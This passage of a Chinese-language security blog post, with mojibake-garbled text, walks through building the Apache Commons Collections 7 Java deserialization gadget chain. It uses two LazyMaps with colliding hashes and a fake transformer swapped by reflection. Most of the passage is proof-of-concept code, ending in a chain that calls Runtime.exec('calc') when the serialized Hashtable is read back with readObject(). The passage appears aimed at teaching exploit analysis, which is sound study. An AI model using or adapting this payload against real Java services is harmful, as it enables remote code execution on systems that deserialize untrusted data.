<h4 id="ä¸¤ä¸ªLazyMap"><a href="#ä¸¤ä¸ªLazyMap" class="headerlink" title="ä¸¤ä¸ªLazyMap"></a>ä¸¤ä¸ªLazyMap</h4><p>åœ¨<code>Hashtable.reconstitutionPut()</code>ä¸­ï¼Œ<strong>forå¾ªç¯</strong>é‡Œè§¦å‘äº†æˆ‘ä»¬çš„åˆ©ç”¨é“¾ã€‚ä½†å¦‚æœæˆ‘ä»¬<strong>tab</strong>é‡Œåªæœ‰ä¸€ä¸ªkey-valueå¯¹ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå†è§¦å‘äº†ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡åŠ å…¥key-valueå¯¹æ—¶tabé‡Œé¢æ²¡æœ‰å€¼ï¼Œæ˜¯ä¸ä¼šè¿›å…¥forå¾ªç¯çš„ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//å¦‚æœtabé‡Œä¸ºç©ºï¼Œä¸ä¼šè¿›å…¥forå¾ªç¯</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// åªä¼šç›´æ¥æ·»åŠ key-valueåˆ°è¿™ä¸ªtabé‡Œ</span>
<span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
count<span class="token operator">++</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ·»åŠ ä¸¤ä¸ª<strong>lazyMap</strong>,è€Œç¬¬äºŒä¸ª<strong>lazyMap</strong>æ‰èƒ½è®©æˆ‘ä»¬è¿›å…¥<strong>forå¾ªç¯</strong></p>
<p>æ”¹è¿›åPOCå¦‚ä¸‹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
<span class="token class-name">Map</span> innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>

<span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯æ˜¯è¿™æ ·çš„POCä¾ç„¶ä¸å¯¹ã€‚</p>
<h4 id="ä¸€æ ·çš„hash"><a href="#ä¸€æ ·çš„hash" class="headerlink" title="ä¸€æ ·çš„hash"></a>ä¸€æ ·çš„hash</h4><p>ä¾ç„¶æ˜¯forå¾ªç¯çš„æ¯›ç—…</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>hash <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">%</span> tab<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//å¦‚æœtabé‡Œä¸ºç©ºï¼Œä¸ä¼šè¿›å…¥forå¾ªç¯</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‡è®¾æˆ‘ä»¬ç°åœ¨å·²ç»putäº†ç¬¬ä¸€ä¸ªkey-valueå¯¹ï¼Œç°åœ¨tabçš„å†…å®¹å¦‚ä¸‹</p>
<ul>
<li><code>&lt;lazyMap,1&gt;</code></li>
</ul>
<p>å½“æˆ‘ä»¬ç”¨ç¬¬äºŒä¸ª<code>&lt;lazyMap2,2&gt;</code>å¼€å§‹æ‰§è¡Œ<strong>for loop</strong>çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­<strong>tab[index]<strong>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœtabé‡Œé¢ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±ä¸èƒ½è¿›å…¥</strong>forå¾ªç¯</strong>ï¼ˆå¤ªå‘äº†ï¼‰- æ„å‘³ç€æˆ‘ä»¬ç¬¬ä¸€æ¬¡çš„**hash(key)<strong>å’Œç¬¬äºŒæ¬¡çš„</strong>hash(key)**å¿…é¡»ä¸€æ ·</p>
<p>ç»æµ‹è¯•å½“lazyMapçš„keyå€¼ä¸ºxxå’ŒzZæ—¶ï¼Œå¾—åˆ°çš„hashCodeæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿè¿›å…¥forå¾ªç¯</p>
<p>ç°åœ¨çš„POCï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>

<span class="token class-name">Map</span> innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>


<span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Fake-Transformer"><a href="#Fake-Transformer" class="headerlink" title="Fake Transformer"></a>Fake Transformer</h4><p>å’Œcc6å·®ä¸å¤šï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œ**hashtable.put()**æ—¶ï¼ŒåŒæ ·ä¼šè§¦å‘åˆ©ç”¨é“¾</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206205356150.png" alt="image-20211206205356150" loading="lazy"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å…ˆä¼ å…¥ä¸€ä¸ª<strong>fakeTransformer</strong>ï¼Œæœ€åå†æ”¹å›æ¥å°±å¥½äº†</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*
 * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
 * */</span>

<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
        <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
<span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œæˆ‘ä»¬ä¼ å…¥å‡çš„transformerï¼Œå®é™…ä¸ºç©º</span>

<span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>

<span class="token class-name">Map</span> innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>


<span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Field</span> field <span class="token operator">=</span> chainedTransformer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//åºåˆ—åŒ–</span>
<span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–</span>
objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
 * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
 * */</span>
<span class="token comment">//ååºåˆ—åŒ–</span>
<span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŸæœ¬ä»¥ä¸ºè¿™æ ·å°±ç»“æŸäº†ï¼Œç»“æœè®¡ç®—å™¨åˆä¸è·³å‡ºæ¥äº†ã€‚è¿˜è®°å¾—<strong>cc6</strong>å—ï¼Œæˆ‘ä»¬å‡ºç°çš„é—®é¢˜å’Œè¿™ä¸ªä¸€æ¨¡ä¸€æ ·</p>
<h4 id="FakeTransformerå¼•å‘çš„LazyMapé—®é¢˜"><a href="#FakeTransformerå¼•å‘çš„LazyMapé—®é¢˜" class="headerlink" title="FakeTransformerå¼•å‘çš„LazyMapé—®é¢˜"></a>FakeTransformerå¼•å‘çš„LazyMapé—®é¢˜</h4><p>åœ¨<code>LazyMap.get()</code>ä¸­ï¼Œ<code>factory</code>ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ç©ºçš„<code>Transformer</code>ï¼Œkeyå€¼ä¸º<code>yy</code>ï¼ŒåŒæ—¶keyå€¼è¢«æ”¾å…¥<code>hashtable</code>.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œkeyå€¼ä¸ºyy</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//yyè¢«æ”¾è¿›hashtable</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210624980.png" alt="image-20211206210624980" loading="lazy"></p>
<p>æˆ‘ä»¬åœ¨<code>AbstractMap.equals()</code>æ–¹æ³•ä¸­æœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼Œæ­¤å¤„çš„**size()**ä¸º1ï¼Œ<code>m.size()</code>ä¸º2 -ã€‹ å› ä¸º<code>yy</code>è¢«åŠ è¿›äº†<code>hashtable</code>ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¿”å›falseï¼Œä»è€Œä¸ä¼šè§¦å‘åˆ©ç”¨é“¾ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210904041.png" alt="image-20211206210904041" loading="lazy"></p>
<p>å› æ­¤æˆ‘ä»¬éœ€è¦æŠŠ<code>yy</code>ä»<code>lazyMap</code>ä¸­ç§»é™¤ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="POCæ„é€ -2"><a href="#POCæ„é€ -2" class="headerlink" title="POCæ„é€ "></a>POCæ„é€ </h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">AbstractMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections7</span> <span class="token punctuation">&#123;</span>
